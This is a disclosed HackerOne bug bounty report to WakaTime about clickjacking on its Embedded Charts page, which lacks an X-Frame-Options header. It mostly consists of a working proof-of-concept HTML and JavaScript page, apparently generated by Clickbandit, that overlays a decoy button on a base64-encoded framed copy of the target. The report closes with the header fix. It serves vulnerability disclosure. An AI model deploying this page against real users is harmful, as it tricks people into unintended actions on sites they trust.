# UI Redressing on Embedded Charts

## Report Details
- **Report ID**: 244697
- **URL**: https://hackerone.com/reports/244697
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-06-30T10:35:04.706Z
- **Disclosed**: 2017-07-05T06:23:20.688Z

## Reporter
- **Username**: mr_r3boot
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wakatime

## Vulnerability Information
Hi Team, Wanna report you that Embedded Charts part is missing X-Frame-Options header hence vulnerable to clickjacking vulnerability.

#PoC:
Just login to your account and open below html page you can see how simply victim can be clickjacked.
```

<div id="container" style="clip-path:none;clip:auto;overflow:visible;position:absolute;left:0;top:0;width:100%;height:100%">
<input id="clickjack_focus" style="opacity:0;position:absolute;left:-5000px;">
<div id="clickjack_button" style="opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 129px; height: 34px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;"><div style="position:relative;top: 50%;transform: translateY(-50%);">Click</div></div>
<div id="clickjack_complete" style="display:none;-webkit-transform-style: preserve-3d;-moz-transform-style: preserve-3d;transform-style: preserve-3d;font-family:Arial;font-size:16pt;color:red;text-align:center;width:100%;height:100%;"><div style="position:relative;top: 50%;transform: translateY(-50%);">You've been clickjacked!</div></div>
<iframe id="parentFrame" src="data:text/html;base64,PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIGZ1bmN0aW9uKGUpeyB2YXIgZGF0YSwgY2hpbGRGcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjaGlsZEZyYW1lIik7IHRyeSB7IGRhdGEgPSBKU09OLnBhcnNlKGUuZGF0YSk7IH0gY2F0Y2goZSl7IGRhdGEgPSB7fTsgfSBpZighZGF0YS5jbGlja2JhbmRpdCl7IHJldHVybiBmYWxzZTsgfSBjaGlsZEZyYW1lLnN0eWxlLndpZHRoID0gZGF0YS5kb2NXaWR0aCsicHgiO2NoaWxkRnJhbWUuc3R5bGUuaGVpZ2h0ID0gZGF0YS5kb2NIZWlnaHQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLmxlZnQgPSBkYXRhLmxlZnQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLnRvcCA9IGRhdGEudG9wKyJweCI7fSwgZmFsc2UpOzwvc2NyaXB0PjxpZnJhbWUgc3JjPSJodHRwczovL3dha2F0aW1lLmNvbS9zaGFyZS9lbWJlZCIgc2Nyb2xsaW5nPSJubyIgc3R5bGU9IndpZHRoOjEzNDlweDtoZWlnaHQ6MTU1NHB4O3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6LTQzcHg7dG9wOi01OTFweDtib3JkZXI6MDsiIGZyYW1lYm9yZGVyPSIwIiBpZD0iY2hpbGRGcmFtZSIgb25sb2FkPSJwYXJlbnQucG9zdE1lc3NhZ2UoSlNPTi5zdHJpbmdpZnkoe2NsaWNrYmFuZGl0OjF9KSwnKicpIj48L2lmcmFtZT4=" scrolling="no" style="-ms-transform: scale(1.0);-ms-transform-origin: 200px 200px;transform: scale(1.0);-moz-transform: scale(1.0);-moz-transform-origin: 200px 200px;-o-transform: scale(1.0);-o-transform-origin: 200px 200px;-webkit-transform: scale(1.0);-webkit-transform-origin: 200px 200px;opacity:0.5;border:0;position:absolute;z-index:1;width:1349px;height:1554px;left:0px;top:0px" frameborder="0"></iframe>
</div>
<script>function findPos(obj) {
	    var left = 0, top = 0;
	    if(obj.offsetParent) {
	        while(1) {
	          left += obj.offsetLeft;
	          top += obj.offsetTop;
	          if(!obj.offsetParent) {
	            break;
	          }
	          obj = obj.offsetParent;
	        }
	    } else if(obj.x && obj.y) {
	        left += obj.x;
	        top += obj.y;
	    }
	    return [left,top];
  	}function generateClickArea(pos) {
			var elementWidth, elementHeight, x, y, parentFrame = document.getElementById('parentFrame'), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight, 
				btn = document.getElementById('clickjack_button');
			if(pos < window.clickbandit.config.clickTracking.length) {
				clickjackCompleted(false);
				elementWidth = window.clickbandit.config.clickTracking[pos].width;
				elementHeight = window.clickbandit.config.clickTracking[pos].height;
				btn.style.width = elementWidth + 'px';
				btn.style.height = elementHeight + 'px';
				window.clickbandit.elementWidth = elementWidth;
				window.clickbandit.elementHeight = elementHeight;
				x = window.clickbandit.config.clickTracking[pos].left;
				y = window.clickbandit.config.clickTracking[pos].top;
				docWidth = window.clickbandit.config.clickTracking[pos].documentWidth;
				docHeight = window.clickbandit.config.clickTracking[pos].documentHeight;
				parentOffsetWidth = desiredX - x;
				parentOffsetHeight = desiredY - y;
				parentFrame.style.width = docWidth+'px';
				parentFrame.style.height = docHeight+'px';
				parentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),'*');
				calculateButtonSize(getFactor(parentFrame));
				showButton();
				if(parentFrame.style.opacity === '0') {
					calculateClip();
				}
			} else {
				resetClip();
				hideButton();
				clickjackCompleted(true);
			}
		}function hideButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 0;
		}function showButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 1;
		}function clickjackCompleted(show) {
			var complete = document.getElementById('clickjack_complete');
			if(show) {
				complete.style.display = 'block';
			} else {
				complete.style.display = 'none';
			}
		}window.addEventListener("message", function handleMessages(e){
			var data;
			try { 
				data = JSON.parse(e.data);
			} catch(e){ 
				data = {}; 
			}
			if(!data.clickbandit) { 
				return false; 
			} 
			showButton(); 
		},false);window.addEventListener("blur", function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById("clickjack_focus").focus();},1000); } }, false);document.getElementById("parentFrame").addEventListener("mouseover",function(){ window.clickbandit.mouseover = true; }, false);document.getElementById("parentFrame").addEventListener("mouseout",function(){ window.clickbandit.mouseover = false; }, false);</script><script>window.clickbandit={mode: "review", mouseover:false,elementWidth:129,elementHeight:34,config:{"clickTracking":[{"width":129,"height":34,"mouseX":289,"mouseY":801,"left":243,"top":791,"documentWidth":1349,"documentHeight":1554},{"width":13,"height":13,"mouseX":249,"mouseY":361,"left":243,"top":356,"documentWidth":1349,"documentHeight":1554},{"width":13,"height":13,"mouseX":246,"mouseY":393,"left":243,"top":386,"documentWidth":1349,"documentHeight":1554},{"width":129,"height":34,"mouseX":268,"mouseY":674,"left":243,"top":648,"documentWidth":1349,"documentHeight":1554}],"currentPosition":0}};function calculateClip() {
			var btn = document.getElementById('clickjack_button'), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById('container'), x = btn.offsetLeft, y = btn.offsetTop;
			container.style.overflow = 'hidden';
			container.style.clip = 'rect('+y+'px, '+(x+w)+'px, '+(y+h)+'px, '+x+'px)';
			container.style.clipPath = 'inset('+y+'px '+(x+w)+'px '+(y+h)+'px '+x+'px)';
		}function calculateButtonSize(factor) {
			var btn = document.getElementById('clickjack_button'), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);
			btn.style.width = resizedWidth + 'px';
			btn.style.height = resizedHeight + 'px';
			if(factor > 100) {
				btn.style.fontSize = '400%';
			} else {
				btn.style.fontSize = (factor * 100) + '%';
			}
		}function resetClip() {
			var container = document.getElementById('container');
			container.style.overflow = 'visible';
			container.style.clip = 'auto';
			container.style.clipPath = 'none';
		}function getFactor(obj) {
			if(typeof obj.style.transform === 'string') {
				return obj.style.transform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.msTransform === 'string') {
				return obj.style.msTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.MozTransform === 'string') {
				return obj.style.MozTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.oTransform === 'string') {
				return obj.style.oTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.webkitTransform === 'string') {
				return obj.style.webkitTransform.replace(/[^\d.]/g,'');
			}
			return 1;
		}</script>
```

#Fix:
Implementation of "X-Frame-Options: SameOrigin/Deny" depends on requirement will resolve the issue.

Let me know if any further info is required.

Regards,
Mr.R3boot

## Attachments
- clickjacked.html
